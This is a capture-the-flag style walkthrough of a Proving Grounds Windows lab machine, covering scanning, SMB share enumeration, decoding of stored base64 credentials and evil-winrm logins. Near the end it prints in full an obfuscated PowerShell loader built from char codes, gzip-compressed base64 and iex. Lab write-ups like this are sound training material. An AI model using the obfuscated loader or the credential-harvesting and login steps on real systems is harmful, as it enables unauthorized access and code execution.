---
tags: [ProvingGround]
---

Compromised 7/2/2025

------------------------------------

## 1. Nmap scan report for 192.168.208.152
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2025-07-02T20:10:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2021-06-01T08:00:08
|_Not valid after:  2021-08-30T08:00:08
| http-methods:
|_  Potentially risky methods: TRACE
| tls-alpn:
|_  http/1.1
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

## Host script results
| smb2-time:
|   date: 2025-07-02T20:10:10
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

## 2. Http port 80 investigation
- Ran nikto and gobuster with few interesting results

## 3. Http port 5985
- Looks to be remote powershell access

## 4. Https port 443
- SSL cert says commonName=PowerSheelWebAccessTestWebsite
- https://192.168.208.152/pswa resolves to powershell remote site access for username/password

## 5. SMB investigation
- smbclient -L \\\\192.168.208.152\\ | tee smblist

Password for [WORKGROUP\kali]:do_connect: Connection to 192.168.208.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)


Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Scripts$        Disk
Users$          Disk
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

- smbclient //192.168.208.152/Scripts$
- smb: \> ls
.                                   D        0  Tue Jun  1 08:57:45 2021
..                                  D        0  Tue Jun  1 08:57:45 2021
defrag.ps1                          A       49  Tue Jun  1 08:57:45 2021
fix-printservers.ps1                A      283  Tue Jun  1 08:57:45 2021
install-features.ps1                A       81  Tue Jun  1 08:57:45 2021
purge-temp.ps1                      A      105  Tue Jun  1 08:57:45 2021
- cat fix-prinservers.ps1
```bash
$credential = New-Object System.Management.Automation.PSCredential ('scripting', $password)
```
```bash
$spooler = Get-WmiObject -Class Win32_Service -ComputerName (Read-Host -Prompt 'Server Name') -Credential $credential -Filter "Name='spooler'"
```
```bash
$spooler.stopservice()
```
```bash
$spooler.startservice()
```

- smbclient //192.168.208.152/Users$
- Found profile.ps1 in user scripting documents.
- Cat profile.ps1
```bash
cat profile.ps1
```
```bash
$password = ConvertTo-SecureString "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgByAGkAZQBuAGQAcwBEAG8AbgB0AEwAZQB0AEYAcgBpAGUAbgBkAHMAQgBhAHMAZQA2ADQAUABhAHMAcwB3AG8AcgBkAHMA')))" -AsPlainText -Force
```
- echo "RgByAGkAZQBuAGQAcwBEAG8AbgB0AEwAZQB0AEYAcgBpAGUAbgBkAHMAQgBhAHMAZQA2ADQAUABhAHMAcwB3AG8AcgBkAHMA" |base64 -d
FriendsDontLetFriendsBase64Passwords

## 6. Connected to host evil-winrm -i 192.168.28.152 -u scripting -p FriendsDontLetFriendsBase64Passwords
## 7. Looking around as user scripting found C:\Troubleshooting
## 8. Script in C:\Troubleshooting called logs.ps1
## 9. Script grabs log files.
## 10. Ran script.
## 11. powershell-logs.csv created.
## 12. Review of logs showed a base64 run code.
## 13. Converted from base64.
## 14. $Owned = @();$Owned += {$Decoded = [System.Convert]::FromBase64String("H4sIAAAAAAAEAAvJSA3OSM3J8Sz2zUzPKMlMLQrJSMwLAYqW5xelKAIA07xkHB8AAAA=")};$Owned += {[string]::join('', ( (83,116,97,114,116,45,83,108,101,101,112,32,45,83,101,99,111,110,100,115,32,53) |%{ ( [char][int] $_)})) | & ((gv "*mdr*").name[3,11,2]-join'')};$Owned += {if($env:computername -eq "compromised") {exit}};$Owned += {[string]::join('', ( (105,102,32,40,116,101,115,116,45,99,111,110,110,101,99,116,105,111,110,32,56,46,56,46,56,46,56,32,45,81,117,105,101,116,41,32,123,101,120,105,116,125) |%{ ( [char][int] $_)})) | & ((gv "*mdr*").name[3,11,2]-join'')};$Owned += {[string]::join('', ( (105,102,32,40,36,111,119,110,101,100,91,50,93,46,84,111,83,116,114,105,110,103,40,41,32,45,110,101,32,39,105,102,40,36,101,110,118,58,99,111,109,112,117,116,101,114,110,97,109,101,32,45,101,113,32,34,99,111,109,112,114,111,109,105,115,101,100,34,41,32,123,101,120,105,116,125,39,41,32,123,101,120,105,116,125,32,69,108,115,101,32,123,36,109,115,32,61,32,40,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,73,79,46,77,101,109,111,114,121,83,116,114,101,97,109,40,36,68,101,99,111,100,101,100,44,48,44,36,68,101,99,111,100,101,100,46,76,101,110,103,116,104,41,41,125) |%{ ( [char][int] $_)})) | & ((gv "*mdr*").name[3,11,2]-join'')};$Owned += {[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAWgBpAHAAUwB0AHIAZQBhAG0AKAAkAG0AcwAsACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgByAGUAYQBkAHQAbwBlAG4AZAAoACkA")) | iex};$Owned | % {$_|iex}
## 15. After putting code into chatgpt found that is an obfuscated script using char conversion, start-sleep, base64 encoded strings (one Gzip compressed) and dynamic execution using iex.
## 16. I was able to decompress the script and find a password:
-  $compressed = [System.Convert]::FromBase64String("H4sIAAAAAAAEAAvJSA3OSM3J8Sz2zUzPKMlMLQrJSMwLAYqW5xelKAIA07xkHB8AAAA=")
-  $ms = (New-Object System.IO.MemoryStream($compressed,0,$compressed.Length))
-  $gz = New-Object System.IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)
-  $sr = New-Object System.IO.StreamReader($gz)
-  $sr.ReadToEnd()
-  TheShellIsMightierThanTheSword!
## 17. evil-winrm -i 192.168.208.152 -u administrator -p TheShellIsMightierThanTheSword!

